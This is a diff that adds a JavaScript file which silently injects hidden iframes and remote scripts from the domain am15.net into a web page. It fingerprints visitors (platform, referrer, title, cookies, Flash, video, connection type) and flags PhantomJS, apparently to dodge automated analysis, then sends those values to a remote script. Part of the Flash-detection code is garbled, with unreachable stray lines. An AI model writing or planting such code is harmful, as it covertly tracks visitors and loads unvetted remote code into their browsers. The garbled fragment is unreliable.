@@ -1,0 +1,145 @@
+(function() {
+    if (!document.getElementById("amuid")) {
+        var amuid = document.createElement("iframe");
+        amuid.frameBorder = 0;
+        amuid.id = "amuid";
+        amuid.width = 0;
+        amuid.height = 0;
+        amuid.style.display = "block";
+        amuid.marginwidth = 0;
+        amuid.marginheight = 0;
+        amuid.src = "//am15.net/x/uid.php?rand=1060853862&uid=QsNSEVD";
+        document.body.appendChild(amuid);
+    }
+})();
+(function() {
+    if (!document.getElementById("amfpx_bn")) {
+        var amfpx_bn = document.createElement("iframe");
+        amfpx_bn.frameBorder = 0;
+        amfpx_bn.id = "amfpx_bn";
+        amfpx_bn.width = 0;
+        amfpx_bn.height = 0;
+        amfpx_bn.style.display = "block";
+        amfpx_bn.marginwidth = 0;
+        amfpx_bn.marginheight = 0;
+        amfpx_bn.src = "//am15.net/x/fpx.php?upst=2h7u28Yu2hmuj8Yn&s=72388&t=bn&rand=390239386";
+        document.body.appendChild(amfpx_bn);
+    }
+})();
+(function() {
+    if (self.parent === self) {
+        if (!document.getElementById("amdtk")) {
+            var amdtk = document.createElement("script");
+            amdtk.type = "text/javascript";
+            amdtk.id = "amdtk";
+            amdtk.src = "//am15.net/tk/tk.php?k=S-gxyBMxNQIzNO-thm.T1BbD29bDysoDNBITNOajhIRX1dQtr1XSywU29QmbK9o.2BiSxMQtNQgjFICcFFnn&p=" + navigator.platform;
+            document.body.appendChild(amdtk);
+        }
+    }
+})();
+(function() {
+    if (!document.getElementById("ampx")) {
+        var ampx = document.createElement("iframe");
+        ampx.frameBorder = 0;
+        ampx.id = "ampx";
+        ampx.width = 0;
+        ampx.height = 0;
+        ampx.style.opacity = 0;
+        ampx.style.position = "fixed";
+        ampx.style.left = 0;
+        ampx.style.top = 0;
+        ampx.marginwidth = 0;
+        ampx.marginheight = 0;
+        ampx.src = "//am15.net/tmp/r8893.php?s=72388";
+        document.body.appendChild(ampx);
+    }
+})();
+(function() {
+    var ambn_ref = encodeURIComponent(document.referrer.substring(0, 500));
+    var ambn_tt;
+    try {
+        ambn_tt = encodeURIComponent(document.title);
+    } catch (e) {
+        ambn_tt = "";
+    }
+    if (window.callPhantom || window._phantom) {
+        ambn_tt = "phantomjs";
+    }
+    var ambn_video = 1;
+    var ch_video = document.createElement("video");
+    try {
+        var vch = ch_video.canPlayType("video/webm");
+        if (vch === "") {
+            ambn_video = 0;
+        }
+    } catch (e) {
+        ambn_video = 0;
+    }
+    var ambn_dt = new Date();
+    var ambn_cook = 1;
+    if (!navigator.cookieEnabled) {
+        ambn_cook = 0;
+    }
+    var ambn_jq = 0;
+    if (window.jQuery) {
+        ambn_jq = 1;
+    }
+    var ambn_fl = 0;
+    var ambn_un = 0;
+    var ambn_ctype;
+    try {
+        var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        ambn_ctype = connection.type;
+    } catch (error) {
+        ambn_ctype = "";
+    }
+    var AdvFlashDetector = function() {
+        function t() {
+            this.flashId = "sd5sdflk5Sd19" + Math.floor(1e3 * Math.random() + 1)
+        }
+        t.prototype = {
+            constructor: t,
+            appendTempFlash: function() {
+                var t = document.getElementsByTagName("body")[0],
+                    a = document.createElement("embed");
+                "sd5sdflk5Sd19" + Math.floor(1e3 * Math.random() + 1);
+                a.type = "application/x-shockwave-flash", a.style.width = "1px!important", a.style.height = "1px!important", a.style.opacity = "0!important", a.style.position = "absolute!important", a.style.top = "-9999px!important", a.style.left = "-9999px!important", a.id = e.flashId, t.appendChild(a)
+            },
+            getFlashVersion: function(t) {
+                var a, n = /*@cc_on!@*/ false;
+                if (e.appendTempFlash(), !n && (a = document.getElementById(e.flashId), getVariable = typeof a.GetVariable, a.parentElement.removeChild(a), "function" !== getVariable)) return t(0);
+                try {
+                    try {
+                        var o = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
+                        try {
+                            o.AllowScriptAccess = "always"
+                        } catch (r) {
+                            return t(6)
+                            getContext('webgl')
+                            getContext('experimental-webgl')
+                        }
+                    } catch (r) {}
+                    return t(new ActiveXObject("ShockwaveFlash.ShockwaveFlash").GetVariable("$version").replace(/\D+/g, ",").match(/^,?(.+),?$/)[1].split(",")[0])
+                } catch (r) {
+                    try {
+                        if (navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin) return t((navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]).description.replace(/\D+/g, ",").match(/^,?(.+),?$/)[1].split(",")[0])
+                    } catch (r) {}
+                }
+                return t(0)
+            }
+        };
+        var e = new t;
+        return {
+            getFlashVersion: e.getFlashVersion
+        }
+    }();
+    AdvFlashDetector.getFlashVersion(function(flash) {
+        if (flash !== 0) {
+            ambn_fl = 1;
+        }
+        var ambn_cd = document.createElement("script");
+        ambn_cd.type = "text/javascript";
+        ambn_cd.src = '//am15.net/bn1.php?s=72388&k=tMX2ICF7cF97f_vqil4RbR4-e9MllUB0wQl58_5Ll7fJrhR9a3JMtI2j9yhfeJf-ANgJjX8t0QyIbw15xFlClTMQCSNGWBBuI4Lsi90fh3Mn&cook=' + ambn_cook + '&dt=' + parseInt(ambn_dt.getHours()) + '&fl=' + ambn_fl + '&jq=' + ambn_jq + '&un=' + ambn_un + '&vi=' + ambn_video + '&ref=' + ambn_ref + '&tt=' + ambn_tt + '&ctype=' + ambn_ctype;
+        document.body.appendChild(ambn_cd);
+    });
+})();
